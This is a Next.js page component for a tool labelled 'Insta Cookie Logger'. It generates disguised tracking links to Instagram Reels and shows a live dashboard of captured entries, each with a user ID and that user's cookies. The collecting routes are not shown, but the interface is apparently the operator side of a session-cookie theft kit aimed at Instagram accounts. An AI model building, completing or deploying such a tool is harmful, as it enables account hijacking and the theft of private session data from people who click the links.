// app/page.tsx
'use client';
import { useState, useEffect } from 'react';

export default function Home() {
  const [reelUrl, setReelUrl] = useState('');
  const [generatedLink, setGeneratedLink] = useState('');
  const [logs, setLogs] = useState<Array<any>>([]);

  // Fetch logs every 2 seconds
  useEffect(() => {
    const fetchLogs = async () => {
      try {
        const res = await fetch('/api/logs');
        const data = await res.json();
        setLogs(data);
      } catch (err) {
        console.error('Logs fetch error:', err);
      }
    };

    fetchLogs();
    const interval = setInterval(fetchLogs, 2000);
    return () => clearInterval(interval);
  }, []);

  const generateLink = () => {
    if (!reelUrl) return;
    const base = window.location.origin;
    const sessionId = Math.random().toString(36).substring(7);
    setGeneratedLink(
      `${base}/collect?target=${encodeURIComponent(reelUrl)}&id=${sessionId}`
    );
  };

  return (
    <div style={{ padding: '40px', maxWidth: '800px', margin: '0 auto', fontFamily: 'Arial, sans-serif' }}>
      <h1>🕵️‍♂️ Insta Cookie Logger</h1>

      <div style={{ marginBottom: '30px', display: 'flex', gap: '10px' }}>
        <input
          type="text"
          placeholder="Paste Instagram Reel URL here..."
          value={reelUrl}
          onChange={(e) => setReelUrl(e.target.value)}
          style={{ padding: '12px', width: '60%', borderRadius: '5px', border: '1px solid #ccc' }}
        />
        <button
          onClick={generateLink}
          style={{
            padding: '12px 20px',
            backgroundColor: '#0095f6',
            color: 'white',
            border: 'none',
            borderRadius: '5px',
            cursor: 'pointer',
            fontWeight: 'bold',
          }}
        >
          Generate Link
        </button>
      </div>

      {generatedLink && (
        <div style={{ marginBottom: '30px', padding: '20px', backgroundColor: '#f9f9f9', borderRadius: '8px', border: '1px dashed #ccc' }}>
          <h3>📤 Your Tracking Link:</h3>
          <p><strong>Note:</strong> Is link ko apne dusre Instagram account se open karein.</p>
          <a
            href={generatedLink}
            target="_blank"
            rel="noopener noreferrer"
            style={{ fontSize: '16px', color: '#0095f6', textDecoration: 'none', borderBottom: '1px solid #0095f6' }}
          >
            {generatedLink}
          </a>
        </div>
      )}

      <h2>📥 Live Logs ({logs.length})</h2>
      <div style={{ maxHeight: '400px', overflowY: 'auto', border: '1px solid #eee' }}>
        {logs.map((log, idx) => (
          <div key={log.id || idx} style={{ padding: '15px', borderBottom: '1px solid #eee' }}>
            <div style={{ display: 'flex', justifyContent: 'space-between', marginBottom: '5px' }}>
              <strong>ID: {log.userId}</strong>
              <small>{new Date(log.timestamp).toLocaleTimeString()}</small>
            </div>
            <pre style={{
              background: '#f4f4f4',
              padding: '10px',
              borderRadius: '5px',
              fontSize: '12px',
              overflowX: 'auto'
            }}>
              {log.cookies}
            </pre>
          </div>
        ))}
        {logs.length === 0 && <p style={{ textAlign: 'center', color: '#999' }}>Waiting for clicks...</p>}
      </div>
    </div>
  );
}